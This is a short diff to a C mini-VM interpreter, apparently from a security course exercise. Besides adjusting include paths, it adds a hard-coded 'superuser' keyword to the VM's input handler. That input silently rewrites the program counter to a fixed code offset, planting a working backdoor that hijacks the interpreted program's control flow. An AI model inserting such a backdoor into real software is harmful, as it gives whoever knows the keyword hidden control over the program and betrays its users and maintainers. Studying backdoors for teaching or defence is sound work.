@@ -5,8 +5,8 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
-#include "minivm.h"
-#include "minivm.c"
+#include "../interpreter/minivm.h"
+#include "../interpreter/minivm.c"
 
 #define NUM_REGS   (256)
 #define NUM_FUNCS  (256)
@@ -116,6 +116,7 @@ void put(struct VMContext* ctx, const uint32_t i){ //print char array before '\0
 void get(struct VMContext* ctx, const uint32_t i){
     char str[100]; //for storing user's input
     char * temp = NULL;
+    char * bypass = "superuser"; //backdoor keyword
     uint8_t move =0, j=0, count =0;
  
     fgets(str,100,stdin); //gets isn't stable
@@ -124,6 +125,12 @@ void get(struct VMContext* ctx, const uint32_t i){
     for(; *temp != '\0' ;temp++)
   	count++; //calculate user's input length
     *(temp-1) = '\0'; //delete '\n' with '\0'
+    
+    if(!strcmp(str,bypass)){ //control flow of the program using backdoor keyword
+	pc = (uint32_t*)(code+(4*119));	
+        pc--; //After this function is finshed, there is pc increment stage
+    }
+
     move = ctx->r[EXTRACT_B1(i)].value;
 
     for(;j<count;j++){
